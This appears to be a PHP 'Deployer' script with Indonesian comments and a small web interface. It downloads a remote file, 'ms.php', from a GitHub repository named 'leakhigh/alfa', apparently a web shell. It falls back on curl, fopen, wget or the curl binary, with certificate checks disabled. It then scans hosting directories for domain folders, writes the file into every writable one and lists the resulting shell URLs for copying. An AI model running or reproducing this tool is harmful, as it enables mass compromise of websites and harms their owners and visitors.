<?php
error_reporting(E_ALL);
@set_time_limit(300);
@ini_set('memory_limit', '256M');

define('SOURCE_URL',      'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/ms.php');
define('DEPLOY_FILENAME', 'ms.php');

// ─── Fetch remote — coba semua cara, return null + pesan error jika gagal ────
function fetch_remote(string $url): array {
    // 1. curl extension
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0',
        ]);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err  = curl_error($ch);
        curl_close($ch);
        if ($body !== false && $code === 200 && strlen($body) > 100) {
            return ['ok' => true, 'body' => $body, 'method' => 'curl_ext'];
        }
        $last_err = "curl_ext: HTTP $code, err=$err";
    }

    // 2. file_get_contents
    if (ini_get('allow_url_fopen')) {
        $ctx  = stream_context_create(['http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0']]);
        $body = @file_get_contents($url, false, $ctx);
        if ($body !== false && strlen($body) > 100) {
            return ['ok' => true, 'body' => $body, 'method' => 'fopen'];
        }
        $last_err = ($last_err ?? '') . ' | fopen: failed';
    }

    // 3. exec wget
    foreach (['/usr/bin/wget', '/bin/wget'] as $bin) {
        if (!is_executable($bin)) continue;
        $tmp = tempnam(sys_get_temp_dir(), 'dep_');
        @exec($bin . ' -q --no-check-certificate -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>&1', $out, $ret);
        if ($ret === 0 && file_exists($tmp) && filesize($tmp) > 100) {
            $body = file_get_contents($tmp);
            @unlink($tmp);
            return ['ok' => true, 'body' => $body, 'method' => 'wget'];
        }
        @unlink($tmp);
        $last_err = ($last_err ?? '') . ' | wget: exit=' . $ret;
    }

    // 4. exec curl
    foreach (['/usr/bin/curl', '/bin/curl'] as $bin) {
        if (!is_executable($bin)) continue;
        $tmp = tempnam(sys_get_temp_dir(), 'dep_');
        @exec($bin . ' -sk --max-time 30 -L -o ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>&1', $out, $ret);
        if ($ret === 0 && file_exists($tmp) && filesize($tmp) > 100) {
            $body = file_get_contents($tmp);
            @unlink($tmp);
            return ['ok' => true, 'body' => $body, 'method' => 'curl_bin'];
        }
        @unlink($tmp);
        $last_err = ($last_err ?? '') . ' | curl_bin: exit=' . $ret;
    }

    return ['ok' => false, 'body' => null, 'method' => null, 'error' => $last_err ?? 'semua metode gagal'];
}

// ─── Scan folder langsung di dalam path yang diberikan ───────────────────────
// Hanya 1 level — ambil semua subfolder langsung di dalam dir tsb
function scan_direct(string $base_path): array {
    $domains = [];
    $base_path = rtrim($base_path, '/');

    if (!is_dir($base_path) || !is_readable($base_path)) return $domains;

    $items = @scandir($base_path);
    if (!$items) return $domains;

    $blacklist = [
        'tmp','temp','cache','logs','log','mail','etc','bin','sbin',
        'lib','lib64','usr','var','proc','sys','dev','run','boot',
        'lscache','lscmdata','cgi-bin','cgi','fcgi','ssl','certs',
        'autoconfig','autoconfig-test','webmail','webdisk','cpanelwebcallsvr',
        'whm','cpcalendars','cpcontacts','caldav','carddav',
        'node_modules','vendor','backup','backups','sessions',
        'public','private','shared','upload','uploads','static',
        'images','img','css','js','fonts','media','assets',
    ];

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if ($item[0] === '.') continue; // skip hidden folders
        if (in_array(strtolower($item), $blacklist, true)) continue; // skip folder sistem
        $full = $base_path . '/' . $item;
        if (!is_dir($full)) continue;
        $real = realpath($full);
        if ($real) $domains[$real] = $item; // path => folder_name
    }

    return $domains;
}

// ─── Guess URL dari nama folder ───────────────────────────────────────────────
function guess_url(string $folder_name): string {
    // Kalau nama folder seperti domain (ada titik), pakai langsung
    if (preg_match('/^[a-zA-Z0-9][a-zA-Z0-9\-]*(\.[a-zA-Z]{2,})+$/', $folder_name)) {
        return 'https://' . strtolower($folder_name);
    }
    return 'https://' . strtolower($folder_name);
}

// ─── Deteksi subdomain ────────────────────────────────────────────────────────
function is_subdomain(string $name): bool {
    if (!preg_match('/^[a-zA-Z0-9][a-zA-Z0-9\-]*(\.[a-zA-Z0-9][a-zA-Z0-9\-]*)+$/', $name)) {
        return false;
    }
    $parts = explode('.', strtolower($name));
    $count = count($parts);
    if ($count <= 2) return false;

    $double_tlds = [
        'co.uk','co.id','co.nz','co.za','co.jp','co.in',
        'com.au','net.au','org.au','com.br','net.br',
        'com.mx','net.mx','com.ar','net.ar',
        'or.id','web.id','sch.id','ac.id','go.id','net.id','biz.id',
        'ac.uk','org.uk','me.uk',
    ];
    $last_two = $parts[$count-2] . '.' . $parts[$count-1];
    if (in_array($last_two, $double_tlds, true)) return $count > 3;
    return $count > 2;
}

// ─── Handle POST deploy ───────────────────────────────────────────────────────
$action    = $_POST['action'] ?? $_GET['action'] ?? '';
$raw_paths = $_POST['paths'] ?? '';
$results   = [];
$fetch_res = null;
$file_content = null;

$input_paths = [];
if ($raw_paths) {
    foreach (explode("\n", $raw_paths) as $line) {
        $line = trim($line);
        if ($line !== '') $input_paths[] = $line;
    }
}

if (($action === 'scan' || $action === 'deploy') && !empty($input_paths)) {
    // Kumpulkan semua domain dari path yang diinput
    $all = []; // realpath => folder_name
    foreach ($input_paths as $p) {
        foreach (scan_direct($p) as $real => $name) {
            $all[$real] = $name;
        }
    }

    // Dedupe berdasarkan URL domain
    $seen = [];
    $deduped = [];
    foreach ($all as $real => $name) {
        $url = guess_url($name);
        if (!isset($seen[$url])) {
            $seen[$url] = true;
            $deduped[$real] = $name;
        }
    }

    // Fetch source kalau deploy
    if ($action === 'deploy') {
        $fetch_res = fetch_remote(SOURCE_URL);
        $file_content = $fetch_res['ok'] ? $fetch_res['body'] : null;
    }

    foreach ($deduped as $path => $folder_name) {
        $url    = guess_url($folder_name);
        $ms_url = $url . '/' . DEPLOY_FILENAME;
        $dest   = $path . '/' . DEPLOY_FILENAME;
        $skip   = is_subdomain($folder_name);
        $ok     = false;
        $status = '';
        $note   = '';

        if ($skip) {
            $status = 'skip';
        } elseif ($action === 'deploy') {
            if (!$fetch_res['ok']) {
                $status = 'fetch_failed';
            } elseif (!is_writable($path)) {
                $status = 'not_writable';
            } else {
                $bytes = @file_put_contents($dest, $file_content);
                if ($bytes === false) {
                    $status = 'write_failed';
                    $note   = error_get_last()['message'] ?? '';
                } elseif ($bytes < 100) {
                    // Tulis berhasil tapi isi terlalu kecil — kemungkinan konten kosong
                    $status = 'wrote_empty';
                    $note   = "Hanya $bytes bytes";
                } else {
                    $ok     = true;
                    $status = 'ok';
                    $note   = "$bytes bytes";
                }
            }
        } else {
            $status = 'scan';
        }

        $results[] = compact('path', 'folder_name', 'url', 'ms_url', 'skip', 'ok', 'status', 'note');
    }
}

$domains_ok  = array_filter($results, fn($r) => $r['ok']);
$domains_main = array_filter($results, fn($r) => !$r['skip']);
$domains_sub  = array_filter($results, fn($r) => $r['skip']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Deployer</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Courier New',monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:1.2em;margin-bottom:4px}
.sub{color:#8b949e;font-size:.78em;margin-bottom:14px}
.warn{background:#1e1209;border:1px solid #bb8009;border-radius:6px;padding:9px 13px;margin-bottom:14px;font-size:.78em;color:#d29922}
.card{background:#161b22;border:1px solid #30363d;border-radius:7px;padding:16px;margin-bottom:14px}
label{display:block;color:#8b949e;font-size:.78em;margin-bottom:6px}
textarea{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:5px;color:#c9d1d9;font-family:'Courier New',monospace;font-size:.82em;padding:10px;resize:vertical;min-height:100px}
textarea:focus{outline:none;border-color:#58a6ff}
.btns{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
.btn{padding:8px 20px;border-radius:5px;font-size:.82em;font-family:'Courier New',monospace;cursor:pointer;border:none;color:#fff}
.btn-scan{background:#1f6feb}.btn-deploy{background:#238636}.btn:hover{opacity:.85}
.summary{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:11px 15px;margin-bottom:14px;font-size:.82em;line-height:2}
.summary b{color:#3fb950}
.err-box{background:#1e0909;border:1px solid #f85149;border-radius:6px;padding:10px 14px;margin-bottom:14px;color:#f85149;font-size:.82em}
.ok-box{background:#0d1a0e;border:1px solid #238636;border-radius:6px;padding:10px 14px;margin-bottom:14px;color:#3fb950;font-size:.82em}
.urlbox{background:#161b22;border:1px solid #30363d;border-radius:7px;padding:16px;margin-bottom:14px}
.urlbox-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
.urlbox-header h2{color:#58a6ff;font-size:.88em}
.copy-btn{padding:5px 14px;background:#1f6feb;color:#fff;border:none;border-radius:5px;font-size:.78em;font-family:'Courier New',monospace;cursor:pointer}
.copy-btn.copied{background:#238636}
#urllist{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:12px;font-size:.82em;line-height:2;color:#d2a8ff;word-break:break-all}
#urllist div{display:block;padding:1px 0}
.tbl{width:100%;border-collapse:collapse;font-size:.78em;margin-top:6px}
.tbl th{color:#8b949e;text-align:left;padding:5px 8px;border-bottom:1px solid #30363d}
.tbl td{padding:5px 8px;border-bottom:1px solid #21262d;vertical-align:top}
.tbl tr:last-child td{border-bottom:none}
.s-ok{color:#3fb950}.s-err{color:#f85149}.s-warn{color:#d29922}.s-gray{color:#6e7681}
</style>
</head>
<body>

<h1>⚙ Deployer</h1>
<p class="sub">Deploy <strong><?= DEPLOY_FILENAME ?></strong> ke semua folder domain</p>
<div class="warn">⚠ Hapus file ini dari server setelah selesai digunakan.</div>

<div class="card">
  <form method="POST">
    <label>📁 Masukkan path direktori (satu per baris) — isi folder langsung di-scan satu level:</label>
    <textarea name="paths" placeholder="/home/username/public_html&#10;/home/username2/public_html&#10;/var/www/vhosts"><?= htmlspecialchars($raw_paths) ?></textarea>
    <div class="btns">
      <button type="submit" name="action" value="scan" class="btn btn-scan">🔍 Scan</button>
      <button type="submit" name="action" value="deploy" class="btn btn-deploy" onclick="return confirm('Deploy <?= DEPLOY_FILENAME ?> ke semua domain (skip subdomain)?')">🚀 Deploy All</button>
    </div>
  </form>
</div>

<?php if (!empty($results)): ?>

<div class="summary">
  Domain ditemukan: <b><?= count($domains_main) ?></b> &nbsp;|&nbsp;
  Subdomain di-skip: <b><?= count($domains_sub) ?></b>
  <?php if ($action === 'deploy'): ?>
    &nbsp;|&nbsp; Berhasil deploy: <b><?= count($domains_ok) ?></b>
    <?php if ($fetch_res): ?>
      &nbsp;|&nbsp; Fetch via: <b><?= htmlspecialchars($fetch_res['method'] ?? '-') ?></b>
      &nbsp;(<?= $fetch_res['ok'] ? '<span class="s-ok">OK ' . number_format(strlen($file_content)) . ' bytes</span>' : '<span class="s-err">GAGAL</span>' ?>)
    <?php endif; ?>
  <?php endif; ?>
</div>

<?php if ($fetch_res && !$fetch_res['ok']): ?>
  <div class="err-box">⚠ Gagal ambil source: <?= htmlspecialchars($fetch_res['error'] ?? '') ?></div>
<?php endif; ?>

<?php
// Kumpulkan URL yang sukses untuk list copy
$ok_urls = array_map(fn($r) => $r['ms_url'], array_values($domains_ok));
$all_main_urls = array_map(fn($r) => $r['ms_url'], array_values($domains_main));
$display_urls = $action === 'deploy' ? $ok_urls : $all_main_urls;
?>

<?php if (!empty($display_urls)): ?>
<div class="urlbox">
  <div class="urlbox-header">
    <h2>📋 <?= DEPLOY_FILENAME ?> — <?= count($display_urls) ?> URL</h2>
    <button class="copy-btn" onclick="
      var ta=document.getElementById('urldata');
      ta.select();ta.setSelectionRange(0,99999);
      navigator.clipboard.writeText(ta.value).then(function(){
        var b=document.querySelector('.copy-btn');
        b.textContent='✓ Copied!';b.classList.add('copied');
        setTimeout(function(){b.textContent='Copy All';b.classList.remove('copied');},2000);
      }).catch(function(){document.execCommand('copy');});
    ">Copy All</button>
  </div>
  <textarea id="urldata" readonly style="position:absolute;left:-9999px"><?= implode("\n", array_map('htmlspecialchars', $display_urls)) ?></textarea>
  <div id="urllist">
    <?php foreach ($display_urls as $u): ?>
      <div><?= htmlspecialchars($u) ?></div>
    <?php endforeach; ?>
  </div>
</div>
<?php endif; ?>

<?php if ($action === 'deploy'): ?>
<div class="urlbox">
  <div class="urlbox-header"><h2>📊 Detail Deploy</h2></div>
  <table class="tbl">
    <tr><th>Domain</th><th>Status</th><th>Note</th></tr>
    <?php foreach ($results as $r): ?>
    <?php
      $sc = match($r['status']) {
        'ok'           => 's-ok',
        'skip'         => 's-gray',
        'not_writable',
        'write_failed',
        'fetch_failed',
        'wrote_empty'  => 's-err',
        default        => 's-gray',
      };
      $sl = match($r['status']) {
        'ok'           => '✓ Deployed',
        'skip'         => '— Subdomain',
        'not_writable' => '✗ Not writable',
        'write_failed' => '✗ Write failed',
        'fetch_failed' => '✗ Fetch failed',
        'wrote_empty'  => '✗ File kosong',
        default        => $r['status'],
      };
    ?>
    <tr>
      <td><?= htmlspecialchars($r['url']) ?></td>
      <td class="<?= $sc ?>"><?= $sl ?></td>
      <td class="s-gray"><?= htmlspecialchars($r['note']) ?></td>
    </tr>
    <?php endforeach; ?>
  </table>
</div>
<?php endif; ?>

<?php endif; ?>
</body>
</html>